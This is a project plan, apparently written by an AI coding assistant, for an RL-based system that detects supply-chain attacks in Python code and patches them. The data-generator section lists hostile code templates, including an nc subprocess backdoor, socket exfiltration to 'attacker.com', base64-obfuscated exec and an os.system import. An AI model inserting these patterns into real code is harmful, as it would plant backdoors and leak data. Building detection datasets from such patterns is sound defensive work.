@@ -1,0 +1,277 @@
+# Sentinel-Synth Phase 1 — Implementation Plan
+
+## Goal
+
+Build the complete Sentinel-Synth system: an RL-based supply-chain attack detection platform with synthetic data generation, a Gymnasium environment, Docker-sandboxed validation, GRPO training (Unsloth + W&B), and a Streamlit dashboard.
+
+## Project Structure
+
+```
+PatchHawk/
+├── sentinel_synth/
+│   ├── __init__.py
+│   ├── envs/
+│   │   ├── __init__.py
+│   │   └── sentinel_env.py          # Gymnasium RL environment
+│   ├── data/
+│   │   ├── __init__.py
+│   │   ├── generate_scenarios.py    # Synthetic data pipeline
+│   │   ├── benign/                  # 20-30 benign Python files
+│   │   └── scenarios.json           # Generated dataset (output)
+│   ├── validation/
+│   │   ├── __init__.py
+│   │   ├── docker_runner.py         # Docker sandbox execution
+│   │   └── patch_validator.py       # 3-step patch validation
+│   ├── training/
+│   │   ├── __init__.py
+│   │   └── train_grpo.py            # GRPO + Unsloth + W&B training
+│   ├── dashboard/
+│   │   └── app.py                   # Streamlit demo UI
+│   └── tests/
+│       ├── __init__.py
+│       └── test_validator.py        # Unit tests for validator
+├── docker/
+│   └── Dockerfile.sandbox           # Lightweight Python sandbox
+├── requirements.txt
+├── setup.py
+└── README.md
+```
+
+---
+
+## Proposed Changes
+
+### Component 1: Benign Code Corpus (`sentinel_synth/data/benign/`)
+
+#### [NEW] 25 benign Python files
+
+Create 25 small, self-contained Python files that serve as the benign corpus for mutation. Categories:
+- **Math utilities** (5): fibonacci, factorial, prime check, gcd, matrix ops
+- **String utilities** (5): palindrome, anagram, caesar cipher, word count, slug generator
+- **Data structures** (5): stack, queue, linked list, binary search, sorting
+- **File/IO utilities** (5): CSV parser, JSON formatter, config reader, log parser, template engine
+- **Misc** (5): temperature converter, password validator, date formatter, calculator, URL parser
+
+Each file exports a main function with docstring and is testable with simple assertions.
+
+---
+
+### Component 2: Synthetic Data Generator (`sentinel_synth/data/generate_scenarios.py`)
+
+#### [NEW] [generate_scenarios.py](file:///home/ram/Ram/repos/PatchHawk/sentinel_synth/data/generate_scenarios.py)
+
+**Key design decisions:**
+- **Track A (Meta synthetic-data-kit)**: Will be implemented as a pluggable module. Since it requires a running vLLM server with Llama 3 8B, the generator will have a `--use-sdk` flag. When disabled, it generates SDK-style examples from hardcoded templates (for offline/demo use).
+- **Track B (Mutation engine)**: Deterministic mutation of benign files using 8 attack templates.
+- Output: `scenarios.json` with 50+ entries.
+
+**Attack templates (8):**
+1. Typosquatting import (`import pythonn`)
+2. Obfuscated exec (`exec(base64.b64decode(...))`)
+3. Environment variable hijack (`os.environ['PATH'] = '/tmp'`)
+4. Subprocess backdoor (`subprocess.call(['nc', ...])`)
+5. Pickle deserialization (`pickle.loads(untrusted)`)
+6. Hidden eval in decorator (`eval(user_input)`)
+7. Socket exfiltration (`socket.connect(('attacker.com', 80))`)
+8. Malicious `__import__` (`__import__('os').system('...')`)
+
+**Scenario JSON schema:**
+```json
+{
+  "id": "tp_001",
+  "type": "true_positive|false_positive|functional",
+  "code_snippet": "...",
+  "patch": "...|null",
+  "unit_test_code": "...|null",
+  "label": "malicious|benign",
+  "source": "mutation_engine|synthetic_data_kit|manual",
+  "attack_type": "typosquatting|obfuscated_exec|...|null"
+}
+```
+
+---
+
+### Component 3: Docker Sandbox (`docker/Dockerfile.sandbox` + `sentinel_synth/validation/docker_runner.py`)
+
+#### [NEW] [Dockerfile.sandbox](file:///home/ram/Ram/repos/PatchHawk/docker/Dockerfile.sandbox)
+
+Minimal Python 3.11-slim image with non-root user, no network, memory/CPU limits.
+
+#### [NEW] [docker_runner.py](file:///home/ram/Ram/repos/PatchHawk/sentinel_synth/validation/docker_runner.py)
+
+- `run_in_docker(code, timeout_sec=5)` → `{"stdout", "stderr", "exit_code", "network_blocked", "file_writes"}`
+- Uses `docker` Python SDK for container management
+- Automatic temp directory cleanup
+- Graceful container kill on timeout
+
+---
+
+### Component 4: Patch Validator (`sentinel_synth/validation/patch_validator.py`)
+
+#### [NEW] [patch_validator.py](file:///home/ram/Ram/repos/PatchHawk/sentinel_synth/validation/patch_validator.py)
+
+Three-step validation pipeline:
+1. **Syntax check**: `py_compile` in Docker
+2. **Unit test execution**: Run scenario's `unit_test_code` against patched code in Docker
+3. **Re-attack verification**: Confirm vulnerability is neutralized by comparing original vs. patched execution telemetry
+
+Returns `(bool, str, dict)` — (passed, message, details).
+
+---
+
+### Component 5: Gymnasium Environment (`sentinel_synth/envs/sentinel_env.py`)
+
+#### [NEW] [sentinel_env.py](file:///home/ram/Ram/repos/PatchHawk/sentinel_synth/envs/sentinel_env.py)
+
+- Inherits `gymnasium.Env`
+- **Observation space**: `Dict` with `code_snippet` (Text), `static_flags` (Box[5]), `risk_score` (Box[1])
+- **Action space**: `Discrete(5)` — ANALYZE, EXECUTE_SANDBOX, BLOCK_PR, SUBMIT_PATCH, REQUEST_REVIEW
+- `max_steps = 5`
+- `reset()`: Random scenario selection, compute static flags + risk score
+- `step(action)`: Full reward logic per spec (BLOCK=+2/-1, PATCH=+3/-1.5/-1, etc.)
+- Integrates `docker_runner` and `patch_validator`
+
+---
+
+### Component 6: GRPO Training (`sentinel_synth/training/train_grpo.py`)
+
+#### [NEW] [train_grpo.py](file:///home/ram/Ram/repos/PatchHawk/sentinel_synth/training/train_grpo.py)
+
+- Load `Qwen2.5-Coder-7B` via Unsloth in 4-bit with LoRA
+- Custom reward function that runs full environment trajectory
+- `GRPOTrainer` from `trl` with group_size=4
+- **W&B integration**: Log per-epoch metrics (mean reward, action distribution, patch success rate, loss)
+- Hyperparameters: `lr=1e-6`, `group_size=4`, `ppo_clip_eps=0.2`, `max_seq_length=1024`
+- Output: LoRA adapter to `./grpo_lora/`
+
+> [!IMPORTANT]
+> The training script requires GPU access (MI300X target) and a significant amount of VRAM for even the 4-bit model. During development, we'll include a `--dry-run` mode that validates the pipeline without actually training.
+
+---
+
+### Component 7: Streamlit Dashboard (`sentinel_synth/dashboard/app.py`)
+
+#### [NEW] [app.py](file:///home/ram/Ram/repos/PatchHawk/sentinel_synth/dashboard/app.py)
+
+- Code input text area
+- "Analyze" button triggers environment run
+- Display panels: Agent decision, Patch code, Validation result, Docker telemetry
+- Demo mode with pre-loaded examples (1 malicious, 1 benign)
+- Dark-themed UI with Cobalt Blue accent colors
+- W&B run link display
+
+---
+
+### Component 8: Tests (`sentinel_synth/tests/test_validator.py`)
+
+#### [NEW] [test_validator.py](file:///home/ram/Ram/repos/PatchHawk/sentinel_synth/tests/test_validator.py)
+
+4 test cases using pytest:
+1. `test_syntax_error_detected` — patch with syntax error → `(False, "Syntax error", ...)`
+2. `test_unit_test_pass` — correct patch → `(True, "Patch is valid", ...)`
+3. `test_unit_test_fail` — broken patch → `(False, "Unit test failed", ...)`
+4. `test_vulnerability_remains` — incomplete patch → `(False, "Vulnerability remains", ...)`
+
+---
+
+### Component 9: Project Configuration
+
+#### [NEW] [requirements.txt](file:///home/ram/Ram/repos/PatchHawk/requirements.txt)
+
+```
+gymnasium>=0.29.0
+docker>=7.0.0
+streamlit>=1.30.0
+unsloth>=2024.0
+trl>=0.7.0
+transformers>=4.38.0
+torch>=2.1.0
+wandb>=0.16.0
+pytest>=8.0.0
+peft>=0.8.0
+datasets>=2.16.0
+```
+
+#### [NEW] [setup.py](file:///home/ram/Ram/repos/PatchHawk/setup.py)
+
+Standard setuptools configuration registering `sentinel_synth` as a package.
+
+#### [MODIFY] [README.md](file:///home/ram/Ram/repos/PatchHawk/README.md)
+
+Full project documentation with architecture diagram, setup instructions, usage guide, and data flow.
+
+---
+
+## User Review Required
+
+> [!IMPORTANT]
+> **vLLM / Llama 3 dependency**: Track A of the data generator requires a running vLLM server with Llama 3 8B. Should I:
+> - (A) Implement it with a fallback to template-based generation when the server is unavailable?
+> - (B) Skip Track A entirely for Phase 1 and use only the mutation engine (Track B) + manual templates?
+
+> [!IMPORTANT]
+> **Docker requirement**: The sandbox and validator require Docker to be installed and the current user to have Docker permissions. Should I add a `--no-docker` mode that simulates sandbox execution for development/testing without Docker?
+
+> [!WARNING]
+> **W&B API key**: The training script needs a W&B API key. I'll use `wandb.login()` which reads from `WANDB_API_KEY` env var or prompts interactively. Is this acceptable?
+
+---
+
+## Open Questions
+
+1. **GPU availability**: Is the MI300X available now for testing the training script, or should I focus on making the pipeline work with `--dry-run` first?
+2. **Benign corpus**: Should I create the 25 benign Python files from scratch (my plan), or do you have an existing corpus to use?
+3. **synthetic-data-kit version**: Which version of Meta's synthetic-data-kit should I target? The API may have changed.
+
+---
+
+## Verification Plan
+
+### Automated Tests
+```bash
+# 1. Generate scenarios
+python -m sentinel_synth.data.generate_scenarios --output sentinel_synth/data/scenarios.json
+
+# 2. Validate scenarios.json has 50+ entries
+python -c "import json; d=json.load(open('sentinel_synth/data/scenarios.json')); assert len(d)>=50"
+
+# 3. Build Docker sandbox image
+docker build -t sentinel-sandbox:latest -f docker/Dockerfile.sandbox .
+
+# 4. Run unit tests
+pytest sentinel_synth/tests/test_validator.py -v
+
+# 5. Test environment with gym checker
+python -c "import gymnasium; from sentinel_synth.envs.sentinel_env import SentinelEnv; env=SentinelEnv(); gymnasium.utils.env_checker.check_env(env)"
+
+# 6. Dry-run training
+python -m sentinel_synth.training.train_grpo --dry-run
+
+# 7. Launch dashboard
+streamlit run sentinel_synth/dashboard/app.py
+```
+
+### Manual Verification
+- Verify Docker containers are properly isolated (no network, memory limits)
+- Verify W&B dashboard shows training metrics
+- Verify Streamlit dashboard renders correctly with demo examples
+
+---
+
+## Execution Order
+
+```mermaid
+graph TD
+    A[1. Project scaffolding + requirements] --> B[2. Benign corpus - 25 files]
+    B --> C[3. Data generator + scenarios.json]
+    A --> D[4. Dockerfile.sandbox]
+    D --> E[5. docker_runner.py]
+    E --> F[6. patch_validator.py]
+    C --> G[7. sentinel_env.py]
+    F --> G
+    G --> H[8. train_grpo.py + W&B]
+    F --> I[9. test_validator.py]
+    H --> J[10. Streamlit dashboard]
+    G --> J
+    J --> K[11. README.md]
+```
